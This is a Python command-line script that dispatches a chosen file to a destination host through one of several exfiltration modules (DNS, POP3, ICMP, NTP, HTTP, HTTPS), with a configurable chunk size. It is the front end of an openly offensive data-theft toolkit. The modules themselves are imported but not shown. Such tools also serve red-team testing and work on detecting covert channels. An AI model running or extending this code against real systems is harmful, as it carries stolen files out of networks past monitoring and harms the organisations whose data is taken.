import argparse
import dns_exfil
import pop_exfil_client3
import icmp_exfil_client3
import ntp_exfil
import http_exfiltration

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--destination", type=str)
    parser.add_argument("-f", "--file", type=str)
    parser.add_argument("-i", "--protocol", type=str)
    parser.add_argument("-s", "--size", type=int)
    args = parser.parse_args()
    
    if args.protocol.lower() == "dns":
        dns_exfil.dns_exfil(args.destination, args.file, max_packet_size=args.size)
    elif args.protocol.lower() == "pop3":
        pop_exfil_client3.send_file(args.destination, args.file, CHUNK=args.size)
    elif args.protocol.lower() == "icmp":
        icmp_exfil_client3.send_file(args.destination, args.file, mtu=args.size)
    elif args.protocol.lower() == "ntp":
        ntp_exfil.exfiltrate(args.destination, args.file, MAX_BYTES=args.size)
    elif args.protocol.lower() == "http":
        http_exfiltration.send_file("http://" + args.destination, args.file, max_packet_size=args.size)
    elif args.protocol.lower() == "https":
        http_exfiltration.send_file("https://" + args.destination, args.file, max_packet_size=args.size)
    
    print(args.protocol)

if __name__ == "__main__":
    try:
        main()
    except:
        print("\nlrn2use properly\n")